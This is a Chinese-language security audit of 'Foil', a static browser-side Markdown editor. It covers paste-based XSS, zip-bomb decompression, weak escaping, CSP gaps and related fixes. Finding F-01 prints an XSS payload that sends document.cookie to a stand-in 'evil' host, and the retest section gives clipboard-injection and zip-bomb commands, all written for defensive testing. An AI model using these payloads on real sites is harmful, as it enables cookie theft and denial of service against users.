# Foil 安全审计报告

- 审计目标：`/Users/yang/workspace/foil`（git `main`，提交 `eee7e6b` 起最新工作树）
- 审计日期：2026-05-22
- 审计范围：前端源码（`src/`）、构建配置（`vite.config.ts`、`tsconfig.json`）、依赖清单（`package.json`、`bun.lock`）、部署工作流（`.github/workflows/`）
- 项目定位：纯静态浏览器端 Markdown 编辑器，文档存于 `localStorage`，分享通过 URL fragment（`#…`）携带 gzip/AES-GCM/tlock 载荷。无后端、无账户、无遥测。

---

## 1. 总评

整体安全姿态较好：

- 内容仅通过 `innerHTML` 注入经 `escapeHtml` 完整转义后的字符串，对 Markdown 中的 HTML 直接走字符级转义；测试 `src/lib/markdown.test.ts` 已覆盖常见 XSS 载荷（codefence、iframe srcdoc、`javascript:` URL、details ontoggle 等）。
- 加密栈采用 Web Crypto AES-GCM-256 + PBKDF2-SHA256 600,000 轮、12 字节随机 IV、16 字节随机盐，已达到 OWASP 2023 推荐值。
- 时间胶囊使用 drand quicknet 的 tlock 方案，链哈希与公钥固化在源码内（`src/lib/timecapsule.ts`），endpoint 全部为 HTTPS。
- 构建注入了较为收紧的 CSP（`script-src 'self'`、`object-src 'none'`、`frame-ancestors 'none'`、`base-uri 'self'`），无第三方脚本。

仍存在若干**中**等以下风险点，主要集中在「可编辑区域粘贴行为」「分享链接的解压未限大小」「文档与代码加密参数不一致」「CSP 可进一步加固」等。下文逐项说明。

---

## 2. 关键发现一览

| 编号 | 严重度 | 标题 | 位置 |
|------|--------|------|------|
| F-01 | 高 | contentEditable 粘贴未拦截，依赖浏览器粘贴清洗 | `src/components/Editor.tsx` |
| F-02 | 中 | 分享链接 gzip 解压无大小上限，存在 zip-bomb DoS | `src/lib/url-codec.ts` |
| F-03 | 中 | `README.md` 标注 PBKDF2 200,000 轮，代码实为 600,000 轮 | `README.md` vs `src/lib/url-codec.ts` |
| F-04 | 中 | `escapeHtml` 不转义 `"`/`'`，复用到属性上下文将立刻成为 XSS | `src/lib/markdown.ts` |
| F-05 | 低 | CSS 选择器注入：`[data-anchor-id="${c.id}"]` 未转义 | `src/App.tsx`、`src/components/Editor.tsx` |
| F-06 | 低 | `DocState` / `CommentThread` 解码后未做字段级 schema 校验 | `src/App.tsx`、`src/lib/url-codec.ts` |
| F-07 | 低 | CSP 缺少 Trusted Types、`form-action`、`upgrade-insecure-requests`；`style-src 'unsafe-inline'` 可降级 | `vite.config.ts` |
| F-08 | 低 | 错误信息直接吐给 Toast，可能泄露内部异常字符串 | `src/App.tsx`、`src/components/TimeCapsuleUnlock.tsx` |
| F-09 | 低 | 接收侧未限制分享 URL 的 hash 长度 | `src/App.tsx` |
| F-10 | 信息 | `bun.lock` 中所有包均指向 `registry.npmmirror.com` | `bun.lock` |
| F-11 | 信息 | `localStorage` / `sessionStorage` 跨脚本可见，无完整性保护 | `src/lib/doc-store.ts` |
| F-12 | 信息 | 分享链接进入地址栏后再被 `history.replaceState` 清除，仍可能被浏览器同步/扩展捕获 | `src/App.tsx`、`README.md` |
| F-13 | 信息 | drand endpoint 列表中除 `api.drand.sh` 外，第二 fallback 为 Cloudflare 镜像，回退顺序固定 | `src/lib/timecapsule.ts` |

---

## 3. 详细分析

### F-01（高）contentEditable 粘贴依赖浏览器自动清洗

**位置**：`src/components/Editor.tsx`

`Editor` 是 `<div contentEditable>`，没有自定义 `onPaste` / `onDrop` 处理器。当用户粘贴时，浏览器按默认行为把 `text/html` 内容写入 DOM，随后 `onInput` 触发 `reRender()`，再以 `getMarkdown(el)`（仅取 `textContent`）重新构造 Markdown 并通过 `renderDecorated()` 写回（此时已被转义）。

**问题**：在「插入 HTML → 触发 `onInput`」之间，恶意 HTML 已存在于实时 DOM。例如：

```html
<img src=x onerror=alert(1)>
<svg><script>fetch('//evil/?'+document.cookie)</script></svg>
```

Chromium 和 Firefox 在 `contentEditable` 粘贴时各有一套（未文档化的）清洗策略：现代浏览器通常会剥离内联事件处理器，但对 `<svg>`/`<math>`/`<iframe srcdoc>`/`<form>` 处理并不一致，且历来出现过绕过 CVE（如 Chromium issue 1130734 系列）。因此**应用层不应把可编辑节点的安全完全外包给浏览器**。

**复现思路**：构造剪贴板，在 `text/html` 槽位写入带事件属性或 SVG 脚本的 HTML，把链接发给受害者并诱导其复制粘贴。即使粘贴源是「无害的链接」，攻击者也可通过 `Clipboard API`、扩展、或在恶意页面用 `document.execCommand('copy')` 注入剪贴板。

**修复建议**：在 `Editor.tsx` 内拦截 `paste` 与 `drop`，只接受纯文本：

```tsx
const onPaste = useCallback((e: React.ClipboardEvent) => {
  e.preventDefault();
  const text = e.clipboardData.getData('text/plain');
  document.execCommand('insertText', false, text);
}, []);

const onDrop = useCallback((e: React.DragEvent) => {
  e.preventDefault();
  const text = e.dataTransfer.getData('text/plain');
  if (text) document.execCommand('insertText', false, text);
}, []);
```

并在 JSX 上挂 `onPaste={onPaste} onDrop={onDrop}`。可与 F-07 的 Trusted Types 收紧一起作为纵深防御。

---

### F-02（中）分享链接解压无大小上限，zip-bomb / DoS

**位置**：`src/lib/url-codec.ts`，`gunzip()`

```ts
const ds = new DecompressionStream('gzip');
const stream = new Blob([bytes as BlobPart]).stream().pipeThrough(ds);
const buf = await new Response(stream).arrayBuffer();
```

`new Response(stream).arrayBuffer()` 会把解压结果**全部缓冲到内存**。攻击者可构造一个极小的恶意 gzip 头（比如包含极高压缩比的全零字段），使解压结果可达 GB 级别，从而让标签页 OOM 崩溃；浏览器全屏卡死也属于明显的可用性攻击。结合「读取 hash 后立即解压」的逻辑，**仅需诱导受害者点击一个短链接**。

虽然 `ShareModal` 在生成端有 8 KB 的"过大"提示，但**接收端没有任何长度校验**：

```ts
const hash = window.location.hash;
if (hash && hash.length > 2) {
  history.replaceState(null, '', window.location.pathname);
  (async () => { const res = await decodeUrl(hash); ... })();
```

**修复建议**：

1. 在接收侧对 `hash.length` 做硬上限（例如 ≤ 32 KB），超出直接拒绝并提示用户。
2. 在 `gunzip` 中读取解压流时分块累积，超过预设阈值（例如 ≤ 4 MB）立即 `controller.terminate()` 并抛错：

```ts
async function gunzipBounded(bytes: Uint8Array, maxBytes = 4 * 1024 * 1024) {
  const ds = new DecompressionStream('gzip');
  const reader = new Blob([bytes as BlobPart]).stream().pipeThrough(ds).getReader();
  const chunks: Uint8Array[] = [];
  let total = 0;
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    total += value.byteLength;
    if (total > maxBytes) {
      reader.cancel();
      throw new Error('Decompressed payload too large');
    }
    chunks.push(value);
  }
  // concat chunks
  const out = new Uint8Array(total);
  let off = 0;
  for (const c of chunks) { out.set(c, off); off += c.byteLength; }
  return out;
}
```

3. 对解压后的 JSON 解析前再校验长度，并对 `JSON.parse` 结果做字段级 schema 校验（见 F-06）。

---

### F-03（中）PBKDF2 参数文档漂移

**位置**：`README.md` 与 `src/lib/url-codec.ts`

- `README.md` 明文标注："AES-GCM-256 using a key derived via PBKDF2-SHA256 (200,000 rounds)"
- `src/lib/url-codec.ts` 实际为 `iterations: 600_000`（`deriveKey` 内部）
- `src/components/HelpModal.tsx` 显示给用户的是 **600,000**

文档不一致本身不是漏洞，但对一款"以加密属性为卖点"的产品而言会引发两类问题：

- 用户在 README 与 UI 文案之间无法判断真实参数，影响**威胁模型可信度**。
- 一旦未来再次调整轮数，README 是首要的对外承诺面，必须随代码同步。

**修复建议**：将 README 第 17 行的 "200,000 rounds" 改为 "600,000 rounds"，或将该具体数字替换为"符合 OWASP 当前推荐"，并在加密函数旁加一句注释指明真值源。

---

### F-04（中）`escapeHtml` 缺少引号转义，扩展使用时容易引入 XSS

**位置**：`src/lib/markdown.ts:4-6`

```ts
export function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
```

仅转义 `&` `<` `>`，未处理 `"` 与 `'`。目前所有调用点都把结果放在 `<span>` 的**文本内容**位置（如 `<span class="syn">${escapeHtml(x)}</span>`），所以暂未触发 XSS。

但这种"靠调用点小心"的设计**很脆弱**：

- 一旦未来有人写 `` `<div title="${escapeHtml(x)}">` ``，单引号或双引号会立刻让属性逃逸，造成 XSS。
- 静态分析工具难以追踪上下文区分。

**修复建议**：把转义函数补全到完整集合，使其在任何上下文中都安全：

```ts
export function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

回归测试已覆盖关键 XSS 形态，补充转义不会破坏现有测试，但建议追加一条断言：

```ts
it('escapes both kinds of quotes', () => {
  expect(escapeHtml('a"b\'c')).toBe('a&quot;b&#39;c');
});
```

---

### F-05（低）CSS 选择器注入

**位置**：`src/App.tsx:345`、`src/components/Editor.tsx`（间接通过 `wrapRangeInEditor` 使用 `c.id`）

```ts
const span = ed.querySelector<HTMLElement>(`[data-anchor-id="${c.id}"]`);
```

`c.id` 来源于解码出的分享链接 JSON。若攻击者把 `id` 设为 `"][onerror=…]` 或含 `\\` 的字符串，`querySelector` 会抛出 `SyntaxError`（被 `try/catch` 吞掉但破坏锚点定位）或匹配到错误元素。这不是直接的 XSS（`querySelector` 不执行脚本），但属于**输入信任边界缺失**。

**修复建议**：

1. 接收端生成新的可信 ID，替换分享链接里的 `c.id`：在 `applyState` 里把 `comments.map((c, i) => ({ ...c, id: 'imp-' + i }))`。
2. 或者使用 `CSS.escape(c.id)` 包裹查询字符串。

---

### F-06（低）解码后的 DocState 缺乏字段级校验

**位置**：`src/App.tsx:174-179`、`src/lib/url-codec.ts:179`

```ts
const applyState = useCallback((state: DocState) => {
  setTitle(state.title || 'Untitled document');
  setMarkdown(typeof state.md === 'string' ? state.md : '');
  setComments(Array.isArray(state.comments) ? state.comments : []);
  setActiveAnchorId(null);
}, []);
```

只检查了顶层三字段，但 `comments[i]` 内部并未校验。攻击者可让 `c.id` / `c.quote` / `c.replies[i].body` 为非字符串（数组、对象、`null`），后续 React 渲染 `{r.body}` 会抛错（非 string/number/ReactNode 类型），导致打开链接即白屏（崩溃式 DoS）。

**修复建议**：增加一个 `sanitizeDocState(raw): DocState` 守门函数，逐字段强制类型、丢弃多余键、截断超长字符串、统一安全 ID（顺便覆盖 F-05）：

```ts
function sanitizeDocState(raw: unknown): DocState {
  const obj = (raw && typeof raw === 'object') ? raw as Record<string, unknown> : {};
  const md = typeof obj.md === 'string' ? obj.md : '';
  const title = typeof obj.title === 'string' ? obj.title : 'Untitled document';
  const rawComments = Array.isArray(obj.comments) ? obj.comments : [];
  const comments = rawComments.slice(0, 1000).flatMap((c, i): CommentThread[] => {
    if (!c || typeof c !== 'object') return [];
    const co = c as Record<string, unknown>;
    return [{
      id: 'imp-' + i,
      quote: typeof co.quote === 'string' ? co.quote.slice(0, 5000) : '',
      before: typeof co.before === 'string' ? co.before.slice(0, 200) : '',
      after: typeof co.after === 'string' ? co.after.slice(0, 200) : '',
      replies: (Array.isArray(co.replies) ? co.replies : []).slice(0, 200).flatMap((r, j) => {
        if (!r || typeof r !== 'object') return [];
        const ro = r as Record<string, unknown>;
        return [{
          id: 'imp-' + i + '-' + j,
          author: typeof ro.author === 'string' ? ro.author.slice(0, 200) : 'Anonymous',
          ts: typeof ro.ts === 'number' && Number.isFinite(ro.ts) ? ro.ts : Date.now(),
          body: typeof ro.body === 'string' ? ro.body.slice(0, 20000) : '',
        }];
      }),
    }];
  });
  return { md, title, comments };
}
```

该函数同时也是 `localStorage` 读取（`getDoc`）的合适加固点：本地数据本身受同源限制保护，但通过浏览器同步 / 扩展写入仍是潜在污染源。

---

### F-07（低）CSP 进一步加固

**位置**：`vite.config.ts`

当前生效的 meta CSP：

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
connect-src 'self' https://api.drand.sh https://drand.cloudflare.com https://api2.drand.sh https://api3.drand.sh;
img-src 'self' data:;
font-src 'self';
object-src 'none';
base-uri 'self';
frame-ancestors 'none';
```

主要问题：

1. **`style-src 'unsafe-inline'`**：源于 `App.tsx:585` 的内联 `<style>{...}</style>` 和大量 `style={{…}}` 内联属性。如果未来引入 CSS injection 漏洞，攻击者可借此植入 `background: url(javascript:…)` 之类的 payload。建议改为基于 nonce / hash 的 `style-src`，或者把 `<style>` 标签内的内容搬到外部 CSS。
2. **缺少 `require-trusted-types-for 'script'`**：源码里直接对 `el.innerHTML` 赋值（`Editor.tsx`），加上该指令可以在浏览器层强制 Trusted Types 包装，配合 F-04 的全转义可形成可靠纵深防御。
3. **缺少 `form-action 'none'`**：应用没有任何提交表单的目标，显式禁止可防御「往攻击者站点 POST」类利用。
4. **缺少 `upgrade-insecure-requests`** 与 `block-all-mixed-content`：GitHub Pages 默认是 HTTPS，但用户可能把 `dist/` 部署到任何静态宿主上，显式声明可避免误降级。
5. **`connect-src` 中的 `'self'`**：站点本身并不需要 fetch 任何同源 API，可以收紧为只列 drand 端点。

建议（部署后请用 https://csp-evaluator.withgoogle.com/ 复查）：

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  connect-src https://api.drand.sh https://drand.cloudflare.com https://api2.drand.sh https://api3.drand.sh;
  img-src 'self' data:;
  font-src 'self';
  manifest-src 'self';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
  form-action 'none';
  upgrade-insecure-requests;
  require-trusted-types-for 'script';
">
```

如果启用 Trusted Types，需要为 `el.innerHTML = renderDecorated(md)` 提供一个策略（`trustedTypes.createPolicy('foil-md', { createHTML: s => s })`，并在策略内做严格审查）。这部分需要源码侧的小幅改造。

---

### F-08（低）错误信息泄露

**位置**：`src/App.tsx:217`、`src/components/TimeCapsuleUnlock.tsx:76`、`url-codec.ts:202`

```ts
} else if (res.error) {
  showToast('Could not load link: ' + res.error);
}
```

`res.error` 来自 `e instanceof Error ? e.message : String(e)`，可能泄露 GCM 解密失败的原始错误（如 `OperationError`、堆栈中的字段）。在本地客户端场景影响有限（用户本就能看自家控制台），但生产页面如果接入了崩溃上报，这些字符串可能携带 attacker-controlled 内容（如解码后的乱码）。

**修复建议**：在 `decodeUrl` 内部白名单几种结构化错误（解码失败 / 解密失败 / 类型错误），Toast 只展示稳定的中文短句，把 `e.message` 留在 `console.debug` 即可。

---

### F-09（低）接收侧未限制 hash 长度

**位置**：`src/App.tsx:192-222`

与 F-02 联动：即使解压侧加了限制，URL 本身也可被刻意做大（数 MB 的 hash 字符串），让 `b64uToBytes` / `atob` 占用大量内存。建议在进入 `decodeUrl` 前就 `if (hash.length > 32_000) reject`。

---

### F-10（信息）依赖来源指向国内镜像

**位置**：`bun.lock`

所有包的 `resolved` 都指向 `https://registry.npmmirror.com/...`。该镜像由阿里云维护，是合理的选择，但若 CI（GitHub Actions）在境外网络中执行：

- `bun install --frozen-lockfile` 会根据 lockfile 中的 URL 去取，**如果该镜像短暂不可达或被劫持，构建会失败/产物可能不一致**。
- 锁文件中已包含 `integrity` 字段（`sha512-…`），可以防御内容篡改；但**保证不被替换**仍依赖镜像方。

**建议**：在 lockfile 中保留 `https://registry.npmjs.org/...` 作为权威来源（开发者本地可用 `.npmrc` 切回镜像），或者明确在 `README.md` 中记录此约定。这是供应链可重现性问题，非直接漏洞。

---

### F-11（信息）`localStorage` 是 XSS 同源资产

`src/lib/doc-store.ts` 把所有文档明文存于 `localStorage`。一旦该源在任何路径上引入了 XSS（包括以后某天有人删了 F-04 的转义），所有本地文档可被 `localStorage` 读出并外泄。

对此应用的威胁模型而言这是预期行为（README 已声明 "Your library is local"），但若未来加入"密码保护本地草稿"功能，需要：

- 用户密码派生密钥（同 PBKDF2 600k 参数），加密后再写入 `localStorage`；
- 内存中也仅在用户活跃时持有解密内容。

当前作为信息条目记录，不要求修复。

---

### F-12（信息）地址栏 hash 残留与同步泄露

`history.replaceState` 在 `useEffect` 内调用，理论上 `window.location.hash` 出现在地址栏的时间窗口非常短，但：

- 浏览器历史会保留**完整 URL**（包括 hash）。
- iCloud Tabs / Chrome Sync 会同步整个 URL。
- 屏幕录制、屏幕分享、屏幕快照会留下证据。
- 部分剪贴板历史扩展会记录 `navigator.clipboard.writeText` 的值。

README 已经提到 "Browser history, sync, and clipboard managers will see the full URL"，符合实际。建议在 `HelpModal` / `ShareModal` 中也对未启用密码或时间胶囊的用户加一行更显眼的提示（"Browser history will keep a copy"），帮助用户做出知情选择。

---

### F-13（信息）drand 端点回退策略固定

`src/lib/timecapsule.ts` 依顺序尝试 `api.drand.sh → drand.cloudflare.com → api2.drand.sh → api3.drand.sh`。如果首个端点被 BGP/DNS 劫持，攻击者仍**无法读取明文**（密钥派生与签名验证基于固化在源码内的链公钥，`tlock-js` 会在解密时校验签名 BLS 验证），但攻击者能够：

- 通过观察请求时机推断"有人正在尝试解锁某胶囊"；
- 对解锁过程做时序攻击（人为延迟）。

这是 README 中已说明的「网络可见性」议题，无需代码修复。可在 README 的 threat model 段加一句"drand operator could see the round being fetched but not the ciphertext or plaintext"以提高透明度。

---

## 4. 已验证为安全的点

- **Markdown XSS**：`renderDecorated()` 与 `inlineHtml()` 先 `escapeHtml` 再做正则替换，`[text](url)` 这类语法**没有**生成真实的 `<a href>`，而是 `<span class="md-link">`，因此 `javascript:` 协议的链接也只显示为文字。测试已覆盖。
- **React 渲染**：评论 `quote`、`body`、`author`、`title` 均通过 JSX 表达式 `{x}` 渲染，自动转义。
- **AES-GCM 参数**：12-byte 随机 IV、16-byte 随机 salt、GCM 自带认证。每次分享均独立生成，无固定 IV 风险。
- **PBKDF2 参数**：600,000 轮 SHA-256 符合 OWASP 2023。
- **drand 链信任**：`chainVerificationParams` 同时锁链哈希和公钥，`HttpCachingChain.info()` 会校验返回的链信息是否匹配，签名解密由 `tlock-js` 在本地执行。
- **新窗口链接**：`HelpModal`、状态栏 GitHub 链接均带 `rel="noopener noreferrer"`，无 reverse tabnabbing。
- **`history.replaceState`**：load 完后立即清掉 hash，避免长期暴露在地址栏。
- **`.gitignore`**：`dist/`、`node_modules/`、`*.log`、`.vite` 均已忽略，无明显机密泄露入仓风险。

---

## 5. 建议优先级排序

1. **立刻修**（提交即可上线，无业务变化）
   - F-03 同步 README 中的 PBKDF2 参数
   - F-04 给 `escapeHtml` 补 `"` `'` 转义
   - F-08 Toast 错误信息白名单
2. **短期内修**（需要小幅改造）
   - F-01 自定义 `onPaste` / `onDrop` 拦截
   - F-02 + F-09 分享链接长度与解压大小上限
   - F-06 接收侧 `sanitizeDocState`
3. **可在下一版加固**（涉及构建/部署）
   - F-05 + F-06 通过 sanitize 顺便处理（接收端重新分配 ID）
   - F-07 CSP 加入 Trusted Types、`form-action`、`upgrade-insecure-requests`
4. **可选记录**
   - F-10 锁文件镜像
   - F-11、F-12、F-13 在 README 或 HelpModal 中显式说明

---

## 6. 复测建议

- 完成 F-01 后用以下 payload 验证：在浏览器开发者工具中执行

  ```js
  await navigator.clipboard.write([new ClipboardItem({
    'text/html': new Blob(['<img src=x onerror="alert(1)">'], { type: 'text/html' }),
    'text/plain': new Blob(['plain fallback'], { type: 'text/plain' }),
  })]);
  ```

  然后在 Foil 编辑器内 ⌘V 粘贴，不应弹出 alert，且编辑器内显示纯文本。
- 完成 F-02 后用 `python -c "import gzip,sys; sys.stdout.buffer.write(gzip.compress(b'A'*(50*1024*1024)))"` 构造 50 MB → 极小的 gzip，base64url 后拼接到 `#d=`，访问应在解压阶段被拒绝。
- 完成 F-04 后跑 `bun run test`，原有 markdown XSS 用例必须全部仍然通过。
- F-07 部署后用 https://csp-evaluator.withgoogle.com/ 或 https://observatory.mozilla.org/ 复评。

---

*本报告基于代码静态审计与威胁建模，未做主动渗透测试。如需对部署产物（GitHub Pages 站点）做线上扫描，请补充 BAS / DAST 工具的结果。*
